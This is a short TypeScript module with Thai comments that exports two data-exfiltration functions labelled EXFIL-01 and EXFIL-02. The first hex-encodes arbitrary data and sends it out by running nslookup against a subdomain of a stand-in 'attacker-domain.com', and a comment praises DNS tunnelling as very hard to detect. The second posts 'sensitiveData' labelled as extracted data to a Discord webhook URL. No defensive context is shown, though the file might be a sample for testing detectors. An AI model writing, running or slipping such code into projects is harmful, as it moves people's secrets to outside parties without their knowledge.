import { exec } from "child_process";
import axios from "axios";

// 🌐 EXFIL-01: DNS Tunneling (ส่งข้อมูลผ่าน DNS query - จับยากมาก)
export function exfiltrateViaDNS(data: string) {
  const encodedData = Buffer.from(data).toString("hex");
  // จำลองการส่งข้อมูลผ่าน lookup
  exec(`nslookup ${encodedData}.attacker-domain.com`);
}

// 🌐 EXFIL-02: Webhook Leakage
export async function sendToWebhook(sensitiveData: any) {
  const WEBHOOK_URL = "https://discord.com/api/webhooks/12345/abcde";
  await axios.post(WEBHOOK_URL, {
    content: `Extracted Data: ${JSON.stringify(sensitiveData)}`,
  });
}
